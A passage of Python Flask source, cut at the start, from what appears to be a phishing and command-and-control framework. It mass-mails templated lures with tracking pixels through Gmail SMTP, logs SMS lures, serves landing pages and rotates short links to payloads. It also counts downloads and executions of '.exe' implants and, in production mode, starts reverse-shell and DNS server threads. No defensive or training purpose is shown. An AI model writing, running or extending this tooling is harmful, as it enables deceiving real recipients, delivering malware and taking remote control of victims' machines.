    response = process_prompt_local_yaml(prompt, False, "web", OUTPUT_FILE_YAML)
    return response

@phishing_bp.route('/phishing/<campaign_id>/track/<email>')
def track_pixel(campaign_id, email):
    """Píxel de seguimiento para registrar aperturas."""
    conn = sqlite3.connect(DB_PATH)
    conn.execute('INSERT INTO tracking VALUES (?, ?, ?, ?, ?)',
                 (campaign_id, email, 'opened', request.remote_addr, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    
    with open(os.path.join(os.getcwd(), 'static', 'images', 'pixel.png'), 'rb') as f:
        return f.read(), 200, {'Content-Type': 'image/png'}

@phishing_bp.route('/phishing/<campaign_id>/report')
@login_required
def campaign_report(campaign_id):
    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
    campaign = load_yaml_safely(campaign_file)
    if not campaign:
        abort(404)
    campaign['id'] = campaign_id

    short_urls = load_short_urls()
    beacon_url = campaign.get('beacon_url', '') if 'vectors' not in campaign else ''
    beacon_short_url = urlparse(beacon_url).path.lstrip('/') if beacon_url else ''

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT event, COUNT(*) FROM tracking WHERE campaign_id = ? GROUP BY event', (campaign_id,))
    stats = {row[0]: row[1] for row in cursor.fetchall()}
    cursor.execute('SELECT email, event, ip, timestamp FROM tracking WHERE campaign_id = ? ORDER BY timestamp DESC', (campaign_id,))
    events = [{'email': row[0], 'event': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
    cursor.execute('SELECT email, event_type, ip, user_agent, timestamp, behavior_data FROM behavioral_tracking WHERE campaign_id = ? OR short_url = ? ORDER BY timestamp DESC', (campaign_id, beacon_short_url))
    behavioral_events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'user_agent': row[3], 'timestamp': row[4], 'behavior_data': row[5]} for row in cursor.fetchall()]
    cursor.execute('SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ? ORDER BY timestamp DESC', (campaign_id,))
    multivector_events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
    conn.close()

    download_events = []
    execution_events = []
    if beacon_short_url:
        download_events = parse_access_log_for_short_url(beacon_short_url)
        stats['downloaded'] = len(download_events)
        stats['interactions'] = len(behavioral_events) + len(multivector_events)
        original_url = short_urls.get(beacon_short_url, {}).get('original_url', 'Unknown')
        for event in download_events:
            event['original_url'] = original_url
        implante = short_urls.get(beacon_short_url, {}).get('original_url', '').split('/')[-1].replace('.exe', '')
        if implante:
            implant_config = load_implant_config(implante)
            if implant_config.get('name') == implante:
                execution_events = parse_execution_log(implante)
                stats['executed'] = len(execution_events)

    if 'vectors' in campaign:
        for vector_type, vector_data in campaign['vectors'].items():
            beacon_url = vector_data.get('beacon_url', '')
            if beacon_url:
                beacon_short_url = urlparse(beacon_url).path.lstrip('/')
                download_events.extend(parse_access_log_for_short_url(beacon_short_url))
                stats['downloaded'] = len(download_events)

    behavioral_analysis = analyze_behavioral_data(behavioral_events)
    return render_template('phishing/report.html',
                         campaign=campaign,
                         stats=stats,
                         events=events,
                         download_events=download_events,
                         execution_events=execution_events,
                         behavioral_analysis=behavioral_analysis,
                         multivector_events=multivector_events)

@phishing_bp.route('/phishing/<campaign_id>/orchestrate', methods=['GET', 'POST'])
@login_required
def orchestrate_campaign(campaign_id):
    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
    campaign = load_yaml_safely(campaign_file)
    if not campaign:
        abort(404)
    campaign['id'] = campaign_id

    if request.method == 'GET':
        return render_template('phishing/orchestrate_campaign.html', campaign=campaign)

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ?', (campaign_id,))
    events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
    conn.close()

    adaptations = analyze_campaign_progress(campaign_id, events)
    short_urls = load_short_urls()
    new_short_url = adaptations.get('short_url', secrets.token_urlsafe(6))
    beacon_url = campaign.get('beacon_url', '') if 'vectors' not in campaign else campaign['vectors'].get('email', {}).get('beacon_url', '')
    short_urls[new_short_url] = {
        'original_url': adaptations.get('payload', beacon_url),
        'active': True,
        'created_at': datetime.now().isoformat()
    }
    save_short_urls(short_urls)

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
        (campaign_id, 'unknown', adaptations['vector'], request.remote_addr, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

    return jsonify({'status': 'adapted', 'vector': adaptations['vector'], 'short_url': new_short_url})


@phishing_bp.route('/phishing/create_multivector_campaign', methods=['GET', 'POST'])
@login_required
def create_multivector_campaign():
    if request.method == 'GET':

        token = secrets.token_urlsafe(32)
        expiry = int(time.time()) + 3600


        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS auth_tokens
                         (user_id INTEGER, token TEXT, expiry INTEGER)''')
        cursor.execute('INSERT INTO auth_tokens (user_id, token, expiry) VALUES (?, ?, ?)',
                       (current_user.id, token, expiry))
        conn.commit()
        conn.close()

        return render_template('phishing/create_multivector_campaign.html',
                              auth_token=token)

    if request.method == 'POST':
        yaml_input = request.form.get('yaml_input')
        auth_token = request.form.get('auth_token')


        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT expiry FROM auth_tokens WHERE user_id = ? AND token = ?',
                       (current_user.id, auth_token))
        result = cursor.fetchone()
        conn.close()

        if not result or result[0] < int(time.time()):
            flash('Invalid or expired authentication token.', 'error')
            return redirect(url_for('phishing.create_multivector_campaign'))

        if not yaml_input:
            flash('YAML input is required.', 'error')
            return redirect(url_for('phishing.create_multivector_campaign'))

        try:
            data = yaml.safe_load(yaml_input)
            if not data or not data.get('name') or not data.get('vectors'):
                flash('Campaign name and vectors are required.', 'error')
                return redirect(url_for('phishing.create_multivector_campaign'))
        except yaml.YAMLError as e:
            logger.error(f"Invalid YAML: {e}")
            flash(f'Invalid YAML: {e}', 'error')
            return redirect(url_for('phishing.create_multivector_campaign'))

        campaign_id = str(uuid.uuid4())
        campaign = {
            'id': campaign_id,
            'name': data['name'],
            'vectors': data.get('vectors', {}),
            'created_at': datetime.now().isoformat()
        }
        try:
            with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
                yaml.safe_dump(campaign, f)
            logger.info(f"Created multi-vector campaign: {campaign_id}")
        except Exception as e:
            logger.error(f"Error saving campaign {campaign_id}: {e}")
            flash('Failed to save campaign.', 'error')
            return redirect(url_for('phishing.create_multivector_campaign'))

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        short_urls = load_short_urls()

        if 'email' in campaign['vectors']:
            email_vector = campaign['vectors']['email']
            template_file = os.path.join(TEMPLATES_DIR, f"{email_vector.get('template', '')}.yaml")
            template = load_yaml_safely(template_file)
            if not template:
                flash('Invalid email template.', 'error')
                return redirect(url_for('phishing.create_multivector_campaign'))
            beacon_url = email_vector.get('beacon_url', '')
            if not beacon_url:
                short_url = secrets.token_urlsafe(6)
                short_urls[short_url] = {
                    'original_url': f'http://{request.host}/track/{short_url}',
                    'active': True,
                    'created_at': datetime.now().isoformat()
                }
                beacon_url = f'http://{request.host}/{short_url}'
                campaign['vectors']['email']['beacon_url'] = beacon_url
            with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
                for recipient in email_vector.get('recipients', []):
                    tracking_url = url_for('phishing.track_pixel', campaign_id=campaign_id, email=recipient, _external=True)
                    html_body = template['body'].format(
                        name=recipient.split('@')[0],
                        beacon_url=beacon_url,
                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />'
                    )
                    yag.send(
                        to=recipient,
                        subject=template['subject'],
                        contents=html_body
                    )
                    cursor.execute(
                        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
                        (campaign_id, recipient, 'email_sent', request.remote_addr, datetime.now().isoformat())
                    )

        if 'sms' in campaign['vectors']:
            sms_vector = campaign['vectors']['sms']
            beacon_url = sms_vector.get('beacon_url', '')
            if not beacon_url:
                short_url = secrets.token_urlsafe(6)
                short_urls[short_url] = {
                    'original_url': f'http://{request.host}/track/{short_url}',
                    'active': True,
                    'created_at': datetime.now().isoformat()
                }
                beacon_url = f'http://{request.host}/{short_url}'
                campaign['vectors']['sms']['beacon_url'] = beacon_url
            message = sms_vector.get('message', '')
            for recipient in sms_vector.get('recipients', []):
                try:
                    formatted_message = message.format(beacon_url=beacon_url)
                    logger.info(f"Sent SMS to {recipient} with message: {formatted_message}")
                    cursor.execute(
                        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
                        (campaign_id, recipient, 'sms_sent', request.remote_addr, datetime.now().isoformat())
                    )
                except Exception as e:
                    logger.error(f"Error sending SMS to {recipient}: {e}")

        if 'landing_page' in campaign['vectors']:
            landing_vector = campaign['vectors']['landing_page']
            beacon_url = landing_vector.get('beacon_url', '')
            if not beacon_url:
                short_url = secrets.token_urlsafe(6)
                short_urls[short_url] = {
                    'original_url': f'http://{request.host}/track/{short_url}',
                    'active': True,
                    'created_at': datetime.now().isoformat()
                }
                beacon_url = f'http://{request.host}/{short_url}'
                campaign['vectors']['landing_page']['beacon_url'] = beacon_url

            template_name = landing_vector.get('template', '')
            if template_name:
                cursor.execute(
                    'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
                    (campaign_id, 'unknown', 'landing_page_created', request.remote_addr, datetime.now().isoformat())
                )
        save_short_urls(short_urls)
        conn.commit()
        conn.close()

        with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
            yaml.safe_dump(campaign, f)

        
        return jsonify({'campaign_id': campaign_id, 'message': 'Multi-vector campaign created successfully'}), 200
        

@phishing_bp.route('/phishing/landing/<campaign_id>/<short_url>')
def serve_landing_page(campaign_id, short_url):
    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
    campaign = load_yaml_safely(campaign_file)
    if not campaign or 'landing_page' not in campaign.get('vectors', {}):
        abort(404)
    short_urls = load_short_urls()
    if short_url not in short_urls or not short_urls[short_url]['active']:
        abort(404)
    template_name = campaign['vectors']['landing_page'].get('template', '')
    if not template_name:
        abort(404)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO multivector_tracking (campaign_id, email, event_type, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
        (campaign_id, 'unknown', 'landing_page_visit', request.remote_addr, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()
    return render_template(f'phishing/landing_pages/{template_name}.html', beacon_url=short_urls[short_url]['original_url'])

thread = Thread(target=run_shell)
thread.daemon = True
thread.start()

if __name__ == '__main__':
    path = os.getcwd().replace("modules", "sessions" )
    uploads = f"{path}/uploads"
    dns_thread = threading.Thread(target=start_dns_server, daemon=True)
    dns_thread.start()
    watching_thread = threading.Thread(target=start_watching, daemon=True)
    watching_thread.start()
    
    if not os.path.exists(uploads):
        os.makedirs(uploads)
    app.register_blueprint(phishing_bp)

    if ENV == 'PROD':
        threading.Thread(target=start_reverse_shell).start()
        app.run(host='0.0.0.0', port=lport, ssl_context=('cert.pem', 'key.pem'))
        socketio.run(app, host='0.0.0.0', port=5000, certfile='cert.pem', keyfile='key.pem', server_side=True)
    else:
        app.run(host='0.0.0.0', port=lport )
